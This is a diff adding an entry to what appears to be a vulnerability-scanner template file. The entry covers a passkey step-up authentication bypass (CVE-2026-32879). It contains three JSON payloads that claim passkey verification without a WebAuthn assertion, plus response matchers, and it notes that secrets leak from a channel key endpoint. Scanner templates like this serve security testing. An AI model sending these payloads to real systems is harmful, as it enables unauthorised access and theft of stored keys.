@@ -1308,7 +1308,103 @@
           }
         }
       ]
+    },
+    "passkey_stepup_no_assertion_2026": {
+      "description": "CVE-2026-32879 — universal-secure-verification step-up bypass. Server-side flow accepts POST {\"method\":\"passkey\"} as proof-of-presence on the basis that the account *has* a passkey record on file, without enforcing a fresh WebAuthn assertion roundtrip. Effective on step-up gates that protect high-impact endpoints (key issuance, settings, payment confirmation). Confirmed upstream: New API channel-secret endpoint /api/channel/:id/key returns stored secrets after the bogus step-up succeeds.",
+      "tech_match": [
+        "webauthn",
+        "passkey",
+        "fido2",
+        "stepup",
+        "step-up",
+        "secure-verification"
+      ],
+      "param_match": [
+        "method",
+        "verification_method",
+        "factor",
+        "auth_method"
+      ],
+      "probes": [
+        {
+          "payload": "{\"method\":\"passkey\"}",
+          "description": "Send the canonical bypass body to a step-up verification endpoint AFTER establishing a session that has a passkey on file. If the server returns 200 with a session-verified marker (set-cookie verified=1, JSON `verified:true`, redirect to the protected resource) WITHOUT performing the WebAuthn challenge/response handshake, the bypass is confirmed.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                204,
+                302
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "\"verified\"\\s*:\\s*true|\"step_up\"\\s*:\\s*\"passed\"|secure_verification(_token)?\\s*=|verified=1"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {
+            "manual_chain": true,
+            "content_type": "application/json",
+            "requires_authenticated_session": true
+          }
+        },
+        {
+          "payload": "{\"method\":\"passkey\",\"credential_id\":\"AAAA\"}",
+          "description": "Variant: include a fabricated credential_id. Vulnerable servers ignore the field entirely (don't look it up); patched servers reject with 400/invalid_credential.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                204
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "invalid_credential",
+                "credential_not_found",
+                "assertion_required"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "manual_chain": true,
+            "content_type": "application/json",
+            "requires_authenticated_session": true
+          }
+        },
+        {
+          "payload": "{\"method\":\"passkey\",\"assertion\":null}",
+          "description": "Null-assertion variant — surfaces servers that check for presence of the assertion field but not its content.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                204
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "\"verified\"\\s*:\\s*true|secure_verification"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {
+            "manual_chain": true,
+            "content_type": "application/json",
+            "requires_authenticated_session": true
+          }
+        }
+      ]
     }
   },
-  "description": ". v1.0 chain-attack contexts: mix-up, audience confusion, JWKS swap, redirect_uri parser quirks (per draft-ietf-oauth-security-topics)."
+  "description": ". v1.0 chain-attack contexts: mix-up, audience confusion, JWKS swap, redirect_uri parser quirks (per draft-ietf-oauth-security-topics). 2026 H2: passkey step-up bypass (CVE-2026-32879)."
 }
